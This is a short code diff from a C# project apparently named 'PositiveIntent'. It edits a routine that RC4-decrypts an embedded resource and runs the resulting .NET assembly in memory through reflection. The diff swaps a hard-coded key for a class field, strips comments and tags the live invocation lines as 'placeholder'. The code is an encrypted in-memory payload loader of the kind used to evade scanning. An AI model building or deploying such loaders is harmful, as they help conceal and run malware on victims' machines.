@@ -9,8 +9,7 @@ namespace PositiveIntent
         public static void LoadAssembly(string[] args)
         {
             byte[] encryptedAssembly = Properties.Resources.File1;
-            byte[] key = System.Text.Encoding.UTF8.GetBytes("DepthSecurity");
-            RC4 rc4 = new RC4(key);
+            RC4 rc4 = new RC4(RC4.key);
 
             // Decrypt assembly
             byte[] decryptedAssembly = rc4.EncryptDecrypt(encryptedAssembly);
@@ -76,14 +75,9 @@ namespace PositiveIntent
                 }
             }
 
-            // Find the entrypoint or "Main" method
             MethodInfo method = assembly.EntryPoint;
-
-            // Get parameters
-            object[] parameters = new[] { args };
-
-            // Invoke the method with the specified parameters
-            object execute = method.Invoke(null, parameters);
+            object[] parameters = new[] { args }; // placeholder
+            object execute = method.Invoke(null, parameters); // placeholder
         }
     }
 }
